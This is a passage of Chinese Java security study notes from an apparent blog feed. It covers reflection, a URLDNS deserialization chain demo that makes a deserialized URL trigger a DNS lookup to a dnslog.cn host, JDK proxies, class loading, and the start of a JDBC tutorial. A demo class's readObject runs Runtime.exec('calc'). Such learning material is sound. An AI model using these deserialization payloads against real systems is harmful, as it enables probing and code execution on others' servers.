class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(p,<span class="number">25</span>);</span><br><span class="line">         System.out.println(p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="comment">//3. 调用类里面的方法</span></span><br><span class="line">             <span class="comment">// 获取类内的方法</span></span><br><span class="line">        Method[] personMethods = c.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m: personMethods)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">// 获取特定的方法, 得指定参数类型</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">            <span class="comment">// 使用invoke调用方法</span></span><br><span class="line">        actionMethod.invoke(p,<span class="string">&quot;action&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaSer.BabyDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_demo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unser</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">obs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        obs.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://0gwgvs.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(url, <span class="number">1234</span>);       <span class="comment">// 随便设置一个hashcode值 只要不是-1就不会在序列化时触发另一个分支</span></span><br><span class="line">        hashMap.put(url, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        field.set(url, -<span class="number">1</span>);   <span class="comment">// 最后修改为hashcode为-1 使得反序列化时能够触发请求分支</span></span><br><span class="line"></span><br><span class="line">        ser(hashMap);</span><br><span class="line">        unser(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202407211929605.png" alt="image-20240613222549532"></p><p>比如Subject是一个抽象类或者接口，RealSubject是实现方法类，是具体的业务逻辑，Proxy则是RealSubject的代理，与客户端直接接触</p><p>代理模式是java设计模式中的一条，指在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强</p><p>代理类和被代理类应该共同实现一个接口，或者共同继承某个类</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>定义接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaProxy;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// IUser接口下有一个show方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代理类，需要实现<code>IUser</code>接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> IUser user;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;proxy show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;proxy update&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;proxy create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在main中进行使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Fastjson.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">// 未经过任何代理</span></span><br><span class="line">        <span class="type">UserImpl</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        user.show();</span><br><span class="line">        <span class="comment">// 静态代理</span></span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        userProxy.show();<span class="comment">// 静态代理类中调用show方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="动态代理-从JDK底层实现"><a href="#动态代理-从JDK底层实现" class="headerlink" title="动态代理 &#x3D;&gt; 从JDK底层实现"></a>动态代理 &#x3D;&gt; 从JDK底层实现</h3><p>静态代理都需要为对应的类实现一个代理类，随着程序规模增大，这这种方法显得臃肿</p><p>因此JDK在底层实现了一套动态代理的机制</p><p>主要是<code>Proxy.newProxyInstance()</code>这个函数方法</p><p>这个是函数原型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                         Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                         InvocationHandler h)</span></span><br></pre></td></tr></table></figure><p>我们的业务逻辑主要在InvocationHandler的具体实现中</p><p>需要重写invoke方法，当调用代理类实例的方法时，会调用invoke方法</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406181139843.png" alt="image-20240618113648072"></p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    IUser user;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;</span><br><span class="line">        IUser iUser;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser iUser)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user = iUser;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写时的参数列表跟着接口中的定义写即可</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 动态代理时进行反射调用</span></span><br><span class="line">            <span class="comment">// 需指明是由哪个对象进行调用该方法</span></span><br><span class="line">            <span class="comment">// 以及参数是什么</span></span><br><span class="line">        System.out.println(method.toString());</span><br><span class="line">        <span class="keyword">if</span>(method.toString().contains(<span class="string">&quot;show&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;This is invoke method when proxy the show method&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(method.toString().contains(<span class="string">&quot;update&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;This is invoke method when proxy the update method&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过invoke方法调用</span></span><br><span class="line">        method.invoke(<span class="built_in">this</span>.user, args);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;        <span class="comment">// 多层代理的话直接返回proxy</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在main中进行调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Fastjson.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">UserImpl</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="comment">// user.show();</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 动态代理</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">userinvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        <span class="comment">// 使用JDK提供的动态代理机制构建一个代理后的对象</span></span><br><span class="line">            <span class="comment">// 参数: ClassLoader, Class&lt;?&gt;[] Interface, InvocationHandler(调用处理器类)</span></span><br><span class="line">        <span class="type">IUser</span> <span class="variable">proxy_users</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(), userinvocationHandler);</span><br><span class="line">        proxy_users.show();</span><br><span class="line">        <span class="comment">//proxy_users.update();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在java安全的应用：</p><blockquote><p>readObject &#x3D;&gt; 反序列化时会自动调用</p><p>invoke &#x3D;&gt; 动态代理时会自动调用重写或原生的invoke函数，从而能够拼接链子</p></blockquote><h1 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h1><blockquote><p>Note：Java中的抽象类不能进行实例化，只能用来被继承</p></blockquote><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaSer.BabyDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现了 Serializable接口的类才能进行序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">// 重写readObject时得先执行defaultReadObject</span></span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重写方法中的逻辑代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在初始化的时候会调用静态方法</p><p>在实例化的时候会调用构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaCode.JavaSer.BabyDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoadClassTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        new Person();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        new Person(&quot;a&quot;, 22);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Person.staticAction();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Person.id = 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Class c = Person.class;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 静态代码块 =&gt; 调用了底层的forName0, 初始化值默认为true</span></span><br><span class="line"><span class="comment">//        Class.forName(&quot;JavaCode.JavaSer.BabyDemo.Person&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;JavaCode.JavaSer.BabyDemo.Person&quot;</span>, <span class="literal">false</span>, cl);</span><br><span class="line">        c.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h2><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202407211947830.png" alt="一个类的完整生命周期"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202407211947816.png" alt="image-20240618121236477"></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>参考我之前的博客：<a href="https://www.cnblogs.com/icfh/p/18048130">https://www.cnblogs.com/icfh/p/18048130</a></p><p>当类进行加载时，需要进入到对应的类加载器，否则可能引起安全问题。所以双亲委派机制主要用于解决类错乱加载的问题，<strong>总结来说就是优先考虑上层的类加载器：</strong></p><ul><li>类加载器收到类加载的请求</li><li>将这个请求向上委托给父类加载器去完成，一直向上委托，知道启动类加载</li><li>启动加载器检查是否能够加载当前这个类，能加载就结束，使用当前的加载器，否则，抛出异常，此时子加载器进行加载</li><li>重复步骤3</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403012233360.png" alt="img"></p><p>具体的代码实现在<code>loadClass</code>函数中</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202407211947490.png" alt=" "></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDBC基础知识</title>
      <link href="/2024/06/11/WebExploit/Java/jdbc/"/>
      <url>/2024/06/11/WebExploit/Java/jdbc/</url>
      
        <content type="html"><![CDATA[<h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><blockquote><p>JDBC，英文全称为Java Database Connectivity，是Java提供对数据库连接、操作的标准API。</p><p>即JDBC是一套API。</p><p>Java本身没有实现对数据库连接、查询、更新等操作，而相关的实现由厂商负责，厂商需要实现JDBC定义的接口</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202407212003659.png" alt="img"></p><p>JDBC库中所包含的API任务通常与数据库使用：</p><ul><li>连接到数据库</li><li>创建SQL或MySQL语句</li><li>在数据库中执行SQL或MySQL查询</li><li>查看和修改记录</li></ul><h2 id="JDBC-Connection"><a href="#JDBC-Connection" class="headerlink" title="JDBC Connection"></a>JDBC Connection</h2><p>实操素材来自遇见狂神说Java</p><ul><li>首先得建一个数据库内容</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126724.png" alt="image-20240611194728081"></p><ul><li>建一个Maven项目，在porm.xml中导入依赖</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126902.png" alt="image-20240611200454708"></p><ul><li>在Java中代码实现的过程：</li></ul><ol><li>加载与注册JDBC驱动</li><li>创建Connection对象 &#x3D;&gt; 创建Statement对象 &#x3D;&gt; 创建ResultSet对象</li></ol><blockquote><p>URL格式为：<code>jdbc:mysql://localhost::3306/jdbcStudy</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126401.png" alt="image-20240611200637091"></p></blockquote><ol start="3"><li>使用<code>ResultSet</code>的<code>getObject</code>方法来获取对应的值</li><li>倒序释放资源</li></ol><p>图示如下：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126365.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 